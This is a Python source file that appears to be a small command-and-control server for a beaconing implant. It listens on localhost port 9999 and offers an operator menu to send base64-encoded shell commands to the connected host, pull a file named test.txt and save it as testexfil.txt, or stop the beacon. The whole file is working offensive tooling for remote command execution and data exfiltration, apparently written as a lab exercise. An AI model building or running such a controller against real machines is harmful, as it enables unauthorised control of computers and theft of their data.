import socketserver  
import base64

class MyTCPHandler(socketserver.BaseRequestHandler):
    """ 
    """

    def handle(self):
        self.data = self.request.recv(2048).strip().decode('utf-8')
        print("\nReceived connection from {}:{}".format(self.client_address[0], self.data))

        option = input("1. Run a command\n2. Exfil test file\n3. Stop beaconing\nOption: ") 

        if option == "1":
            command = input("Enter command: ")

            encodedcommand = base64.b64encode(command.encode("ascii")).decode("ascii")

            self.request.sendall(bytes(encodedcommand, "utf-8"))
            self.data = self.request.recv(2048).strip().decode('utf-8')
            print(self.data)
        elif option == "2":
            command = "cat test.txt"
            self.request.sendall(bytes(command, "utf-8"))
            self.data = self.request.recv(2048).strip().decode('utf-8')

            f = open("testexfil.txt", "x")
            f.write(self.data)
            f.close()
            print("testexfil.txt exfiltrated")

        else:
            self.request.sendall(bytes("1", "utf-8"))

    def menu():
        print("Type exit to stop beacon")

if __name__ == "__main__":
    HOST, PORT = "localhost", 9999

    # Create the server, binding to localhost on port 9999
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        server.serve_forever()